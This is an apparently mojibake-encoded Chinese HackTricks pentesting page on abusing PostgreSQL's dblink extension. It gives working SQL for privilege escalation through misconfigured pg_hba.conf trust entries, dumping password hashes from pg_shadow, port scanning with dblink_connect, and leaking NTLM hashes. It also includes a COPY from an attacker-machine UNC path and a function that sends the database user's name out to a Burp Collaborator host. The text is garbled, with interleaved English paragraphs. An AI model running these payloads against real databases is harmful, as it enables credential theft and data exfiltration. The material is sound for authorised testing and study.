<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricksä»“åº“](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloudä»“åº“](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


è‡ªä»**PostgreSQL 9.1**ç‰ˆæœ¬ä»¥æ¥ï¼Œå®‰è£…é™„åŠ æ¨¡å—å˜å¾—ç®€å•ã€‚[åƒ`dblink`è¿™æ ·çš„æ³¨å†Œæ‰©å±•](https://www.postgresql.org/docs/current/contrib.html)å¯ä»¥é€šè¿‡[`CREATE EXTENSION`](https://www.postgresql.org/docs/current/sql-createextension.html)è¿›è¡Œå®‰è£…ï¼š
```sql
CREATE EXTENSION dblink;
```
ä¸€æ—¦åŠ è½½äº†dblinkï¼Œæ‚¨å°±å¯ä»¥æ‰§è¡Œä¸€äº›æœ‰è¶£çš„æŠ€å·§ï¼š

## æƒé™æå‡

æ–‡ä»¶`pg_hba.conf`å¯èƒ½è¢«é”™è¯¯é…ç½®ï¼Œ**å…è®¸æ¥è‡ªæœ¬åœ°ä¸»æœºçš„ä»»ä½•ç”¨æˆ·è¿æ¥**ï¼Œè€Œæ— éœ€çŸ¥é“å¯†ç ã€‚è¯¥æ–‡ä»¶é€šå¸¸ä½äº`/etc/postgresql/12/main/pg_hba.conf`ï¼Œé”™è¯¯çš„é…ç½®å¦‚ä¸‹ï¼š
```
local    all    all    trust
```
_è¯·æ³¨æ„ï¼Œè¿™ç§é…ç½®é€šå¸¸ç”¨äºåœ¨ç®¡ç†å‘˜å¿˜è®°å¯†ç æ—¶ä¿®æ”¹æ•°æ®åº“ç”¨æˆ·çš„å¯†ç ï¼Œå› æ­¤æœ‰æ—¶æ‚¨å¯èƒ½ä¼šæ‰¾åˆ°å®ƒã€‚_\
_è¿˜è¦æ³¨æ„ï¼Œpg\_hba.confæ–‡ä»¶åªèƒ½ç”±postgresç”¨æˆ·å’Œç»„è¯»å–ï¼Œåªèƒ½ç”±postgresç”¨æˆ·å†™å…¥ã€‚_

å¦‚æœæ‚¨å·²ç»åœ¨å—å®³è€…å†…éƒ¨è·å¾—äº†ä¸€ä¸ªshellï¼Œé‚£ä¹ˆè¿™ç§æƒ…å†µéå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒå°†å…è®¸æ‚¨è¿æ¥åˆ°postgresqlæ•°æ®åº“ã€‚

å¦ä¸€ç§å¯èƒ½çš„é…ç½®é”™è¯¯å¦‚ä¸‹æ‰€ç¤ºï¼š
```
host    all     all     127.0.0.1/32    trust
```
ç”±äºå®ƒå…è®¸æ¥è‡ªæœ¬åœ°ä¸»æœºçš„ä»»ä½•äººä»¥ä»»ä½•ç”¨æˆ·èº«ä»½è¿æ¥åˆ°æ•°æ®åº“ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœ**`dblink`**å‡½æ•°**å¯ç”¨**ï¼Œæ‚¨å¯ä»¥é€šè¿‡é€šè¿‡å·²å»ºç«‹çš„è¿æ¥è¿æ¥åˆ°æ•°æ®åº“å¹¶è®¿é—®ä¸åº”è¯¥è®¿é—®çš„æ•°æ®æ¥**æå‡æƒé™**ï¼š
```sql
SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'SELECT datname FROM pg_database')
RETURNS (result TEXT);

SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'select usename, passwd from pg_shadow')
RETURNS (result1 TEXT, result2 TEXT);
```
**åœ¨è¿™ç¯‡è®ºæ–‡ä¸­æ‰¾åˆ°æ›´å¤šå…³äºè¿™æ¬¡æ”»å‡»çš„ä¿¡æ¯**ã€‚

## ç«¯å£æ‰«æ

æ»¥ç”¨ `dblink_connect`ï¼Œä½ ä¹Ÿå¯ä»¥**æœç´¢å¼€æ”¾çš„ç«¯å£**ã€‚å¦‚æœè¿™ä¸ª**å‡½æ•°ä¸èµ·ä½œç”¨ï¼Œä½ åº”è¯¥å°è¯•ä½¿ç”¨ `dblink_connect_u()`**ï¼Œå› ä¸ºæ–‡æ¡£ä¸­è¯´_`dblink_connect_u()` ä¸ `dblink_connect()` ç›¸åŒï¼Œåªæ˜¯å®ƒå…è®¸éè¶…çº§ç”¨æˆ·ä½¿ç”¨ä»»ä½•èº«ä»½éªŒè¯æ–¹æ³•è¿æ¥_ã€‚
```sql
SELECT * FROM dblink_connect('host=216.58.212.238
port=443
user=name
password=secret
dbname=abc
connect_timeout=10');
//Different response
// Port closed
RROR:  could not establish connection
DETAIL:  could not connect to server: Connection refused
Is the server running on host "127.0.0.1" and accepting
TCP/IP connections on port 4444?

// Port Filtered/Timeout
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTP server
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTPS server
ERROR:  could not establish connection
DETAIL:  received invalid response to SSL negotiation:
```
è¯·æ³¨æ„ï¼Œåœ¨èƒ½å¤Ÿä½¿ç”¨ `dblink_connect` æˆ– `dblink_connect_u` ä¹‹å‰ï¼Œæ‚¨å¯èƒ½éœ€è¦æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
```
CREATE extension dblink;
```
## UNCè·¯å¾„ - NTLMå“ˆå¸Œæ³„éœ²

In some cases, it is possible to obtain the NTLM hash of a user's password by exploiting a vulnerability in the UNC (Universal Naming Convention) path functionality. This can be achieved through a technique known as NTLM hash disclosure.

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œé€šè¿‡åˆ©ç”¨UNCï¼ˆé€šç”¨å‘½åçº¦å®šï¼‰è·¯å¾„åŠŸèƒ½ä¸­çš„æ¼æ´ï¼Œå¯ä»¥è·å–ç”¨æˆ·å¯†ç çš„NTLMå“ˆå¸Œã€‚è¿™å¯ä»¥é€šè¿‡ä¸€ç§ç§°ä¸ºNTLMå“ˆå¸Œæ³„éœ²çš„æŠ€æœ¯æ¥å®ç°ã€‚

### How it works

The NTLM hash disclosure technique takes advantage of the fact that when a user accesses a UNC path, the client machine automatically sends the user's NTLM hash to the server hosting the UNC share. This is done as part of the NTLM authentication process.

NTLMå“ˆå¸Œæ³„éœ²æŠ€æœ¯åˆ©ç”¨äº†è¿™æ ·ä¸€ä¸ªäº‹å®ï¼šå½“ç”¨æˆ·è®¿é—®UNCè·¯å¾„æ—¶ï¼Œå®¢æˆ·ç«¯æœºå™¨ä¼šè‡ªåŠ¨å°†ç”¨æˆ·çš„NTLMå“ˆå¸Œå‘é€åˆ°æ‰˜ç®¡UNCå…±äº«çš„æœåŠ¡å™¨ã€‚è¿™æ˜¯NTLMèº«ä»½éªŒè¯è¿‡ç¨‹çš„ä¸€éƒ¨åˆ†ã€‚

To exploit this vulnerability, an attacker can set up a malicious server that responds to UNC requests and captures the NTLM hashes sent by the client machines. The attacker can then use these captured hashes to perform offline password cracking or other malicious activities.

ä¸ºäº†åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥è®¾ç½®ä¸€ä¸ªæ¶æ„æœåŠ¡å™¨ï¼Œå“åº”UNCè¯·æ±‚å¹¶æ•è·å®¢æˆ·ç«¯æœºå™¨å‘é€çš„NTLMå“ˆå¸Œã€‚ç„¶åï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨è¿™äº›æ•è·çš„å“ˆå¸Œæ¥è¿›è¡Œç¦»çº¿å¯†ç ç ´è§£æˆ–å…¶ä»–æ¶æ„æ´»åŠ¨ã€‚

### Mitigation

To mitigate the risk of NTLM hash disclosure through UNC paths, it is recommended to:

- Disable the use of NTLM authentication and use more secure authentication protocols like Kerberos.
- Implement strong password policies to make password cracking more difficult.
- Regularly update and patch systems to fix any known vulnerabilities.
- Monitor network traffic for any suspicious activity and investigate any unauthorized access attempts.

ä¸ºäº†å‡è½»é€šè¿‡UNCè·¯å¾„æ³„éœ²NTLMå“ˆå¸Œçš„é£é™©ï¼Œå»ºè®®é‡‡å–ä»¥ä¸‹æªæ–½ï¼š

- ç¦ç”¨NTLMèº«ä»½éªŒè¯ï¼Œä½¿ç”¨æ›´å®‰å…¨çš„èº«ä»½éªŒè¯åè®®ï¼Œå¦‚Kerberosã€‚
- å®æ–½å¼ºå¯†ç ç­–ç•¥ï¼Œå¢åŠ å¯†ç ç ´è§£çš„éš¾åº¦ã€‚
- å®šæœŸæ›´æ–°å’Œä¿®è¡¥ç³»ç»Ÿï¼Œä¿®å¤å·²çŸ¥çš„æ¼æ´ã€‚
- ç›‘æ§ç½‘ç»œæµé‡ï¼Œå‘ç°ä»»ä½•å¯ç–‘æ´»åŠ¨ï¼Œå¹¶è°ƒæŸ¥ä»»ä½•æœªç»æˆæƒçš„è®¿é—®å°è¯•ã€‚
```sql
-- can be used to leak hashes to Responder/equivalent
CREATE TABLE test();
COPY test FROM E'\\\\attacker-machine\\footestbar.txt';
```

```sql
-- to extract the value of user and send it to Burp Collaborator
CREATE TABLE test(retval text);
CREATE OR REPLACE FUNCTION testfunc() RETURNS VOID AS $$
DECLARE sqlstring TEXT;
DECLARE userval TEXT;
BEGIN
SELECT INTO userval (SELECT user);
sqlstring := E'COPY test(retval) FROM E\'\\\\\\\\'||userval||E'.xxxx.burpcollaborator.net\\\\test.txt\'';
EXECUTE sqlstring;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT testfunc();
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **é€šè¿‡å‘[hacktricksä»“åº“](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloudä»“åº“](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
